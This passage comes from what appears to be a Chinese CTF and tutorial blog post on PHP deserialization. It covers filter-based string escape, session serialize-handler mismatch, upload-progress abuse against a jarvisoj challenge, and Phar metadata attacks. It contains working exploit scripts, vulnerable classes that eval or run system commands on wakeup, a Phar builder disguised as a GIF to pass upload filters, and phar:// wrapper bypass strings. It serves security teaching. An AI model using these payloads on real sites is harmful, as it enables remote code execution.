<li>由于数组的元素为三个，因此序列化里面的内容也要有三个。随意构造一个数据即可，这里是<code>$_SESSION[&#39;name&#39;]=&#39;panda&#39;</code>.</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;user&quot;</span>;s:<span class="number">24</span>:<span class="string">&quot;&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;function&quot;</span>;s:<span class="number">65</span>:<span class="string">&quot;1&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;panda&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;&#125;<span class="string">&quot;;s:3:&quot;</span>img<span class="string">&quot;;s:40:&quot;</span><span class="number">6</span>b9b4b868ded1eb152045ebd5ea11b5be979d3ae<span class="string">&quot;;&#125;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>差不多都改造完了，最后整合。</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$img</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filter_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&#x27;/&#x27;</span>.implode(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$filter_arr</span>).<span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> preg_replace(<span class="variable">$filter</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$img</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$file</span> = <span class="string">&#x27;d0g3_f1ag.php&#x27;</span>;</span><br><span class="line"><span class="variable">$sess</span>[<span class="string">&#x27;user&#x27;</span>] = <span class="string">&#x27;flagflagflagflagflagflag&#x27;</span>;</span><br><span class="line"><span class="variable">$sess</span>[<span class="string">&#x27;function&#x27;</span>] = <span class="string">&#x27;1&quot;;s:4:&quot;name&quot;;s:5:&quot;panda&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$sess</span>[<span class="string">&#x27;img&#x27;</span>] = sha1(base64_encode(<span class="variable">$file</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$ser_info</span> = filter(serialize(<span class="variable">$sess</span>));</span><br><span class="line">print_r(<span class="variable">$ser_info</span>);</span><br><span class="line">print_r(unserialize(<span class="variable">$ser_info</span>));</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">输出展示，后面读文件以此类推即可。</span></span><br><span class="line"><span class="comment">a:3:&#123;s:4:&quot;user&quot;;s:24:&quot;&quot;;s:8:&quot;function&quot;;s:65:&quot;1&quot;;s:4:&quot;name&quot;;s:5:&quot;panda&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:40:&quot;6b9b4b868ded1eb152045ebd5ea11b5be979d3ae&quot;;&#125;</span></span><br><span class="line"><span class="comment">Array</span></span><br><span class="line"><span class="comment">(</span></span><br><span class="line"><span class="comment">    [user] =&gt; &quot;;s:8:&quot;function&quot;;s:65:&quot;1</span></span><br><span class="line"><span class="comment">    [name] =&gt; panda</span></span><br><span class="line"><span class="comment">    [img] =&gt; ZDBnM19mMWFnLnBocA==</span></span><br><span class="line"><span class="comment">)</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<h2 id="Session反序列化"><a href="#Session反序列化" class="headerlink" title="Session反序列化"></a>Session反序列化</h2><ul>
<li><code>Session</code>?这也是一个超全局变量<code>$_Session</code>,主要作用为追踪用户，判断请求是否来自同一个用户。比如有一个登录框，用户输入正确账号和密码后，可以访问更多的功能。但是你怎么知道用户是登录或者没登录呢？那么就需要<code>Session</code>或者<code>Cookie</code>来判断了。登录成功后可在<code>HTTP Headers</code>的<code>Cookie</code>中设置特殊值—<code>Session</code>来区分登录用户和未登录用户。<code>Session</code>和<code>Cookie</code>的主要区别则是<code>Session</code>值存储与服务器段因此更安全，<code>Cookie</code>值存储与客户端。</li>
<li><code>PHP</code>中的<code>Session</code>存储有三种处理器，分别对应三种格式。这三种格式分别使用目前没有问题，但是混合使用则会造成漏洞。</li>
</ul>
<table>
<thead>
<tr>
<th>处理器</th>
<th>存储格式</th>
</tr>
</thead>
<tbody><tr>
<td><code>php</code></td>
<td>键名+竖线（|）+经过<code>serialize</code>序列化后的数据（默认使用该处理器）</td>
</tr>
<tr>
<td><code>php_serialize</code></td>
<td>经过<code>serialize</code>序列化后的数组</td>
</tr>
<tr>
<td><code>php_binary</code></td>
<td>键名长度对应的ASCII的字符+<code>serialize</code>序列化后的数据</td>
</tr>
</tbody></table>
<ul>
<li>分别对应的记录是</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// php处理器</span></span><br><span class="line">ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php&#x27;</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;php&#x27;</span>] = <span class="string">&#x27;php&#x27;</span>;</span><br><span class="line"><span class="comment">// php|s:3:&quot;php&quot;;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="comment">// php_serialize处理器</span></span><br><span class="line">ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php_serialize&#x27;</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;php_serialize&#x27;</span>] = <span class="string">&#x27;php_serialize&#x27;</span>;</span><br><span class="line"><span class="comment">// a:1:&#123;s:13:&quot;php_serialize&quot;;s:13:&quot;php_serialize&quot;;&#125;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// php_binary处理器</span></span><br><span class="line">ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php_binary&#x27;</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;php_binary&#x27;</span>] = <span class="string">&#x27;php_binary&#x27;</span>;</span><br><span class="line"><span class="comment">// 注意这里的输出有个换行，因此php_binary的长度为10，ASCII码对应的字符为&quot;\n&quot;因此有换行</span></span><br><span class="line"><span class="comment">// php_binarys:10:&quot;php_binary&quot;;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>这里思考一下，如果用<code>php_serialzie</code>处理器存储，再用默认的<code>php</code>处理器读取，是否会出现漏洞呢？<code>php</code>处理器读取时会以<code>|</code>作为分隔符，前面作为键名，后面作为键值。假如<code>php_serialize</code>处理器存储的值中用<code>|</code>，再用<code>php</code>处理区去读取，那会怎样呢？</li>
<li>提交<code>$_SESSION[&#39;php_serialize&#39;]=|s:5:&quot;panda&quot;;</code>再用<code>php</code>处理器处理时，会认为键名为<code>a:1:&#123;s:13:&quot;php_serialize&quot;;s:13:&quot;</code>，键值为<code>s:5:&quot;panda&quot;;&quot;;&#125;</code>然后反序列化出来的值则为<code>panda</code>后面的长度则会被舍弃。</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:<span class="number">1</span>:&#123;s:<span class="number">13</span>:<span class="string">&quot;php_serialize&quot;</span>;s:<span class="number">13</span>:<span class="string">&quot;|s:5:&quot;</span>panda<span class="string">&quot;;&quot;</span>;&#125; </span><br></pre></td></tr></table></figure>

<h3 id="浅析Session反序列化"><a href="#浅析Session反序列化" class="headerlink" title="浅析Session反序列化"></a>浅析Session反序列化</h3><ul>
<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.session-start.php">PHP session_start()</a>—<font color=red>会创建新会话或者重用现有会话。如果通过GET或者POST方式，或者使用cookie提交会话ID，则会重用现有会话。当会话开始时，PHP会调用会话管理器的<code>open</code>和<code>read</code>回调函数，通过<code>read</code>函数返回现有会话数据，PHP会自动反序列化数据并且填充<code>$_SESSION</code>超全局变量</font>。</li>
<li>注意上面是<code>GET</code>或者<code>POST</code>请求而不是在<code>PHPSTORM</code>中用<code>PHP</code>脚本执行，这样的话就不是同一个会话，因此无法利用。</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//创建Session CreateSession.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php_serialize&#x27;</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">var_dump(<span class="variable">$_SESSION</span>);</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 读取Session  ReadSession.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php&#x27;</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">vul</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$command</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        system(<span class="keyword">$this</span>-&gt;command);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// exp  Exploit.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">vul</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$command</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$com</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;command = <span class="variable">$com</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$command</span> = <span class="string">&#x27;pwd&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;|&#x27;</span>.serialize(<span class="keyword">new</span> vul(<span class="variable">$command</span>));</span><br><span class="line"><span class="comment">// |O:3:&quot;vul&quot;:1:&#123;s:7:&quot;command&quot;;s:3:&quot;pwd&quot;;&#125;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>主要有以上三个文件，首先是执行<code>exp.php</code>构造攻击<code>payload</code>，然后再在<font color=red>浏览器</font>中打开<code>CreateSession.php</code>提交我们的<code>payload</code>，再在<font color=red>浏览器</font>中打开<code>ReadSession.php</code>读取<code>Session</code>，那么我们的命令就会被执行。</li>
</ul>
<h3 id="jarvisoj-com"><a href="#jarvisoj-com" class="headerlink" title="jarvisoj.com"></a>jarvisoj.com</h3><ul>
<li>上面是<code>Session</code>可控的情况下，正常情况下当然没得这种可能，因此有人提出了另一种利用方式。</li>
<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/session.upload-progress.php">session.upload_progress.enabled</a>—-能够对再每一个文件上传时检测上传进度。当一个上传在处理中，同时POST一个与INI中设置的<code>session.upload_progress</code>一样变量名时，上传进度可以再<code>$_SESSION</code>中获得。</li>
<li>综上所述，就是<font color=red>开启</font><code>session.upload_progress.enabled</code>(<font color=red>PHP5.4后可用且为默认开启</font>)，构造一个文件上传，<code>POST</code>一个为<code>session.upload_process</code>的变量，那么服务器就会将<code>POST</code>的的这个变量作为键值序列化后存储再<code>session</code>中，读取时再反序列化这个<code>session</code>文件。</li>
<li><a target="_blank" rel="noopener" href="http://web.jarvisoj.com:32784/index.php">jarvisoj</a>—-session反序列化。直接给了源码，发现<code>PHPINFO</code>中默认的<code>session</code>存储器与代码中的不一样，因此可能存在漏洞。</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//A webshell is wait for you</span></span><br><span class="line">ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php&#x27;</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OowoO</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mdzz</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mdzz = <span class="string">&#x27;phpinfo();&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;mdzz);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;phpinfo&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$m</span> = <span class="keyword">new</span> OowoO();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    highlight_string(file_get_contents(<span class="string">&#x27;index.php&#x27;</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>上面的代码很简单，如果<code>$mdzz</code>变量可控，那么则会造成一个<code>webshell</code>。这里因为没有可控的反序列化点，因此需要用到上面的知识点。</li>
<li>构造一个文件上传点（upload.html），然后再构造利用链即可。</li>
</ul>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://web.jarvisoj.com:32784/index.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> <span class="attr">value</span>=<span class="string">&quot;panda&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// exp.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OowoO</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mdzz</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$command</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mdzz = <span class="variable">$command</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;|&#x27;</span>.serialize(<span class="keyword">new</span> OowoO(<span class="string">&#x27;print_r(scandir(dirname(__FILE__)));&#x27;</span>));</span><br><span class="line"><span class="comment">// |O:5:&quot;OowoO&quot;:1:&#123;s:4:&quot;mdzz&quot;;s:36:&quot;print_r(scandir(dirname(__FILE__)));&quot;;&#125;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>最后访问构造的<code>upload.html</code>,burp抓包更改上传文件名值为<code>exp.php</code>所输出的内容即可，记得访问题目所携带的<code>cookie</code>。</li>
</ul>
<p><img src="https://gitee.com/pan3a/image/raw/master/PHPDeserialize/jarvisoj.png" alt="jarvisoj"></p>
<h2 id="Phar反序列化"><a href="#Phar反序列化" class="headerlink" title="Phar反序列化"></a>Phar反序列化</h2><ul>
<li>随着安全意识的提高，直接存在的<code>unserialize()</code>的参数也几乎都是不可控了，于是<code>Sam Thomas</code>在<code>BlackHat</code>上提出了新的利用方式。<a target="_blank" rel="noopener" href="https://i.blackhat.com/us-18/Thu-August-9/us-18-Thomas-Its-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It-wp.pdf">议题PDF</a>.</li>
<li>主要参考：<a target="_blank" rel="noopener" href="https://paper.seebug.org/680/#22-demo">Seebug seaii</a>      <a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2958">zsx 师傅</a>. 看他们文章自己所学的一些复现与理解。</li>
<li>议题的主要内容是可以不用再借助反序列化函数构造反序列化利用链，通过<code>php</code>内置的数据流协议—–<code>phar</code>结合一些文件操作函数(参数可控)。</li>
</ul>
<h3 id="浅析Phar"><a href="#浅析Phar" class="headerlink" title="浅析Phar"></a>浅析Phar</h3><ul>
<li>查看官方手册大概讲的就是<code>phar</code>是一个数据压缩协议，可以将多个文件分组成一个文件。可以通过<code>phar</code>协议直接读取，就像类似的<code>zip</code>压缩一样。这样的文件当然有固定的特征。(个人理解)</li>
<li><code>stub</code>,<code>phar</code>文件的标志，格式为：<font color=red><code>xxxxxxx&lt;?php xxxxxxxx; __HALT_COMPILER();?&gt;</code></font>,相当于一段文字只要是<code>__HALT_COMPILER();?&gt;</code>结尾即可。</li>
<li><code>meta-data</code>，用户可以自定义的数据，主要是用来存储文件的权限，属性等信息，同时这部分数据是以序列化存储的。</li>
<li>最后就是文件的签名，来标识数据的结束。</li>
<li>以上就是构造一个<code>phar</code>文件上传，然后就是控制文件操作函数(<code>file_exists()</code>,<code>file_get_contents()</code>等)来触发反序列化操作。</li>
</ul>
<h3 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h3><ul>
<li>这里必须要改<code>php.ini</code>中的<code>phar.readonly = off</code>.假如我们发现有个简单的漏洞，能上传文件，但是把能解析的如<code>php</code>,<code>phtml</code>,<code>php3</code>，<code>htaccess</code>这些都禁止了，那么但靠文件上传也许没办法了(至少我没办法了，哈哈)，这里和上面的<code>Session</code>反序列化有点类似，但是考点不一样，这里无法看<code>Session</code>的存储器读取和存储时是否一致。</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// vul.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">WebShell</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$command</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;command)) &#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;command);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$filename</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$filename</span>))&#123;</span><br><span class="line">    file_get_contents(<span class="variable">$filename</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>这里很明显考的是反序列化，然后我们可控的只有文件名。于是只有<code>Phar</code>反序列化了。构造<code>Phar</code>文件，下图是我们生成出的文件。</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="comment">// CreatePhar.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">WebShell</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$command</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 删除原有的phar</span></span><br><span class="line">@unlink(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 实例化一个类 文件结尾必须是.phar 生成后你可以更改文件后缀</span></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 开始缓冲区输入</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置Phar标识文件,这里也可构造文件头绕过上传</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;setStub(<span class="string">&quot;GIF89a &quot;</span>.<span class="string">&quot;&lt;?php __HALT_COMPILER();?&gt;&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$o</span> = <span class="keyword">new</span> WebShell();</span><br><span class="line"><span class="variable">$o</span>-&gt;command = <span class="string">&#x27;phpinfo();&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置文件属性，添加反序列化内容，构造payload</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$o</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 添加文本,这里的文件名和内容无所谓</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>,<span class="string">&quot;panda&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 停止缓冲区输入</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>这里可以看到前一部分可以为文件头，伪造图片文件头，但是必须以<code>__HALT_COMPILER();?&gt;</code>结尾，后面就是我们序列化的内容。</li>
</ul>
<p><img src="https://gitee.com/pan3a/image/raw/master/PHPDeserialize/HexPhar.png" alt="HexPhar"></p>
<ul>
<li>然后上传我们的文件，再带着上传文件所得的路径去请求<code>vul.php</code>即可，如果不允许上传<code>phar</code>文件，那么将生成的文件改成<code>png</code>这些都行</li>
</ul>
<p><img src="https://gitee.com/pan3a/image/raw/master/PHPDeserialize/PharDemo.png" alt="phardemo"></p>
<ul>
<li>有时候文件上传仅仅是白名单，那么这就很难办了，文件上传似乎是写死了(没有绝对安全的系统，等待大家去发现吧)，这里可以将构造好的<code>phar</code>文件后缀更改，他依旧会解析。综上所述，触发漏洞就必须要以下几点：<font color=red>1–有一个反序列化利用链，2–文件名可控(正则匹配或者可绕过)，3–能够上传文件，并获得文件路径</font>。</li>
<li>如果不能允许开头则<code>phar</code>字符还有其他的方式，后面还有<code>Mysql</code>读取<code>Phar</code>造成的反序列化，但是需要更改<code>mysql</code>配置文件不常用。</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">compress.zlib:<span class="comment">//phar://phar.phar</span></span><br><span class="line"></span><br><span class="line">compress.bzip2:<span class="comment">//phar://phar.phar </span></span><br><span class="line"></span><br><span class="line">php:<span class="comment">//filter/read=convert.base64-encode/resource=phar://panda.png</span></span><br></pre></td></tr></table></figure>

<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181022222243-f07f25fe-d605-1.png" alt="influences"></p>
<h3 id="NCTF2019-phar-matches-everything"><a href="#NCTF2019-phar-matches-everything" class="headerlink" title="NCTF2019 phar matches everything"></a>NCTF2019 phar matches everything</h3><ul>
<li><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[NCTF2019]phar%20matches%20everything">BUU NCTF2019  phar matches everything</a>,由于环境问题，只好自己去<code>Github</code>下载源码–<a target="_blank" rel="noopener" href="https://github.com/swfangzhang/My-2019NCTF/tree/master/phar%20matches%20everything/osrc/app">Github</a>，主要有以下两个文件。</li>
</ul>
